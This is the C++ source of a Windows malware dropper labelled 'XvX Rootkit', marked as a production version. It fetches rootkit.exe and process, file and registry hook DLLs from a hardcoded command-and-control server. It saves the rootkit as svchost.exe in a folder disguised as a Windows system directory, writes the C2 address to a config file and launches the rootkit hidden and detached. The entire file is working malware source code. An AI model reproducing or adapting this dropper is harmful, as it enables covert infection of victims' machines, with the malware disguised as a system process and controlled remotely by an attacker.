/*
 * XvX Rootkit - Dropper
 * Copyright (c) 2025 - 28zaakypro@proton.me
 * 
 * Initial payload deployment and persistence setup.
 * Downloads rootkit.exe and DLLs from HTTP server, establishes persistence.
 */

#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

const wchar_t* C2_SERVER = L"192.168.1.147"; // C2 server IP
const wchar_t* C2_URL = L"https://192.168.1.147:8443";

bool downloadFile(const wchar_t* server, const wchar_t* path, const wchar_t* outputPath) {
    
    // Session
    HINTERNET hSession = WinHttpOpen(
        L"WinHTTP/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) {
        printf("[ERROR] WinHttpOpen failed\n");
        return false;
    }
    
    DWORD timeout = 300000;
    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    
    // Connection
    HINTERNET hConnect = WinHttpConnect(hSession, server, 8000, 0);
    if (!hConnect) {
        printf("[ERROR] WinHttpConnect failed\n");
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Request
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0
    );
    if (!hRequest) {
        printf("[ERROR] WinHttpOpenRequest failed\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Send + Receive
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("[ERROR] WinHttpSendRequest failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("[ERROR] WinHttpReceiveResponse failed\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Check 200 OK
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, 
                       WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       NULL, &statusCode, &statusSize, NULL);
    if (statusCode != 200) {
        printf("[ERROR] HTTP status != 200\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Wait 500ms after receiving 200 OK
    Sleep(500);
    
    // Delete existing file if present (avoids ERROR_SHARING_VIOLATION)
    if (GetFileAttributesW(outputPath) != INVALID_FILE_ATTRIBUTES) {
        
        // Attempt to delete (will fail if process running)
        if (!DeleteFileW(outputPath)) {
            DWORD delError = GetLastError();
            printf("[WARN] DeleteFile failed (error=%lu) - file probably in use\n", delError);
            printf("[INFO] Attempting forced creation...\n");
        } else {
        }
        Sleep(100);
    }
    
    // Create (with FILE_SHARE_DELETE to allow replacement)
    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, FILE_SHARE_DELETE, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD createError = GetLastError();
        printf("[ERROR] CreateFile failed: %S (error=%lu)\n", outputPath, createError);
        if (createError == 3) printf("        -> ERROR_PATH_NOT_FOUND (parent directory missing)\n");
        if (createError == 5) printf("        -> ERROR_ACCESS_DENIED (insufficient permissions)\n");
        if (createError == 32) {
            printf("        -> ERROR_SHARING_VIOLATION (file locked - rootkit running?)\n");
            printf("        -> SOLUTION: Stop the svchost.exe process before retrying\n");
        }
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Download
    char buffer[32768];
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    DWORD totalBytes = 0;
    
    while (true) {
        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
            printf("[ERROR] WinHttpReadData failed\n");
            CloseHandle(hFile);
            DeleteFileW(outputPath);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        if (bytesRead == 0) {
            break;
        }
        
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
            printf("[ERROR] WriteFile failed\n");
            CloseHandle(hFile);
            DeleteFileW(outputPath);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }
        
        totalBytes += bytesWritten;
        Sleep(5);
    }
    
    // Close
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    printf("[SUCCESS] Complete transfer: %lu KB\n", totalBytes / 1024);
    return (totalBytes > 0);
}

int main() {
    // Dropper - Production version
    printf("Server: %S:8000\n", C2_SERVER);
    printf("C2: %S\n\n", C2_URL);
    
    // Installation folder
    wchar_t appdata[MAX_PATH] = {0};
    HRESULT hr = SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    
    wchar_t installDir[MAX_PATH];
    swprintf(installDir, MAX_PATH, L"%ls\\Microsoft\\Windows\\SystemData", appdata);
    
    // Create parent if necessary
    wchar_t parentDir[MAX_PATH];
    swprintf(parentDir, MAX_PATH, L"%ls\\Microsoft\\Windows", appdata);
    CreateDirectoryW(parentDir, NULL);
    
    BOOL dirCreated = CreateDirectoryW(installDir, NULL);
    DWORD dirError = GetLastError();
    
    // Check if folder exists
    DWORD attribs = GetFileAttributesW(installDir);
    if (attribs == INVALID_FILE_ATTRIBUTES) {
        printf("[ERROR] Folder inaccessible!\n");
    } else {
    }
    
    printf("[INFO] Installation folder: %S\n\n", installDir);
    
    // Download rootkit.exe
    printf("[1/4] Downloading rootkit.exe...\n");
    wchar_t rootkitPath[MAX_PATH];
    swprintf(rootkitPath, MAX_PATH, L"%ls\\svchost.exe", installDir);
    
    if (!downloadFile(C2_SERVER, L"/rootkit.exe", rootkitPath)) {
        printf("[FATAL] Failed to download rootkit\n");
        system("pause");
        return 1;
    }
    printf("\n");
    
    // Download DLLs
    printf("[2/4] Downloading processHooks.dll...\n");
    wchar_t dll1[MAX_PATH];
    swprintf(dll1, MAX_PATH, L"%ls\\processHooks.dll", installDir);
    downloadFile(C2_SERVER, L"/processHooks.dll", dll1);
    printf("\n");
    
    printf("[3/4] Downloading fileHooks.dll...\n");
    wchar_t dll2[MAX_PATH];
    swprintf(dll2, MAX_PATH, L"%ls\\fileHooks.dll", installDir);
    downloadFile(C2_SERVER, L"/fileHooks.dll", dll2);
    printf("\n");
    
    printf("[4/4] Downloading registryHooks.dll...\n");
    wchar_t dll3[MAX_PATH];
    swprintf(dll3, MAX_PATH, L"%ls\\registryHooks.dll", installDir);
    downloadFile(C2_SERVER, L"/registryHooks.dll", dll3);
    printf("\n");
    
    // Create c2_config.txt
    printf("[CONFIG] Creating c2_config.txt...\n");
    wchar_t configPath[MAX_PATH];
    swprintf(configPath, MAX_PATH, L"%ls\\c2_config.txt", installDir);
    HANDLE hConfig = CreateFileW(configPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hConfig == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Failed to create c2_config.txt (error=%lu)\n", GetLastError());
    } else {
        // Convert C2_URL to char*
        char c2urlA[256];
        WideCharToMultiByte(CP_UTF8, 0, C2_URL, -1, c2urlA, sizeof(c2urlA), NULL, NULL);
        
        DWORD written;
        if (WriteFile(hConfig, c2urlA, (DWORD)strlen(c2urlA), &written, NULL)) {
            printf("[CONFIG] c2_config.txt created: %s\n\n", c2urlA);
        } else {
            printf("[ERROR] Failed to write c2_config.txt (error=%lu)\n", GetLastError());
        }
        CloseHandle(hConfig);
    }
    
    // Launch rootkit
    printf("[LAUNCH] Starting rootkit...\n");
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (CreateProcessW(rootkitPath, NULL, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW | DETACHED_PROCESS, 
                       NULL, installDir, &si, &pi)) {
        printf("[SUCCESS] Rootkit launched (PID: %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[ERROR] Failed to launch rootkit\n");
    }
    
    printf("\n=== END ===\n");
    system("pause");
    return 0;
}
